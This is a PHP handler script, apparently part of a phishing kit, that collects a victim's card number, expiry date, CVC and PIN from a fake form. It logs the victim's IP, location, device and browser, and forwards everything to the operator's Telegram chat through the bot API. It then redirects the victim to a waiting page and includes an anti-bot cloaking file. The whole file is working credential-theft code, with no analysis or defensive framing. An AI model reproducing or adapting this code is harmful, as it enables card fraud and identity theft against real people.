<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

include("../edit.php");
include '../CRfiles/PHP/botfucker.php'; 
include '../CRfiles/PHP/sys.php';
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['MrCorona'] == 'SpoW')){
  $hostname = gethostbyaddr($ip);
    $coronamsg .= "💰 C A R D - V I C T I M 💰 \n";
    $coronamsg .= "💳 CARD = ".$_POST['cardCorona']."\n";
    $coronamsg .= "📅 EXP = ".$_POST['expCorona']."\n";
    $coronamsg .= "🔒 CVC = ".$_POST['cvvCorona']."\n";
    $coronamsg .= "🔑 PIN CODE = ".$_POST['pinCorona']."\n";
    $coronamsg .= "👀 IP LOOKUP INFORMATION 👀\n";
    $coronamsg .= "🕒 TIME = $date\n";
    $coronamsg .= "🏢 LOCATION = $country/$city\n";
    $coronamsg .= "👀 IP ADDRESS = $ip\n";
    $coronamsg .= "📱 DEVICE = $user_os\n";
    $coronamsg .= "☠️ BROWSER = $user_browser\n";
    $coronamsg .= "     🦸‍♂️  HERO  🦸‍♂️    \n";  
    $send = "";
$subject = "💰 C A R D - V I C T I M 💰 ";
$headers = "From: ".$_POST['cardCorona']." <Spow@business.com>";
    $token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    $infos = "[⚠️] SMS PAGE 1 ON WAY 20 sec";
	 $token = "$coronatoken";
    $data = [
    'text' => $infos,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ../wait.php");}
    else{
      header("Location: ../index.php");}


?>